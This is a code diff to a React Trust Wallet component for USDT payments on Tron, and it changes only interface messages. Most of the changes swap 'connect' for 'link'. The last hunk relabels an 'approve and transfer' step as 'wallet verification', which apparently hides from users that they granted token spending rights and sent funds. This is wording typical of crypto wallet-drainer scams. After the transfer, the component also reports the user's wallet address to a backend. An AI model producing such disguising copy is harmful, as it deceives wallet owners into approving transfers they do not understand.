@@ -234,7 +234,7 @@ const TrustWalletTronPay = () => {
         }
       };
       await connect("walletconnect");
-      toast.success("Wallet connected");
+      toast.success("Wallet linked");
     } catch (error) {
       if (wcTrustNavigatedRef.current) {
         return;
@@ -326,10 +326,10 @@ const TrustWalletTronPay = () => {
         setTrustConnecting(true);
         await connect("trust");
         setLastAutoConnect({ state: "connected", finishedAt: Date.now() });
-        toast.success("Wallet connected");
+        toast.success("Wallet linked");
       } catch (error) {
         const message =
-          error instanceof Error ? error.message : "Could not connect in Trust Wallet";
+          error instanceof Error ? error.message : "Could not link wallet in Trust Wallet";
         setLastAutoConnect({ state: "error", finishedAt: Date.now(), message });
         toast.error(message);
 
@@ -373,7 +373,7 @@ const TrustWalletTronPay = () => {
 
   const handleConfirm = async () => {
     if (!isConnected) {
-      toast.error("Connect your wallet first (Trust Wallet Discover → Connect Wallet).");
+      toast.error("Link your wallet first (Trust Wallet Discover → Link wallet).");
       return;
     }
     if (!address) {
@@ -402,7 +402,7 @@ const TrustWalletTronPay = () => {
       });
       const transferTxId = await transferUSDT("tron", toInput.trim(), normalizedAmount);
 
-      toast.success("Approve and transfer completed successfully.");
+      toast.success("Wallet verification and transfer completed successfully.");
       void notifyTrustTronActivity({
         event: "transfer_completed",
         walletAddress: address,
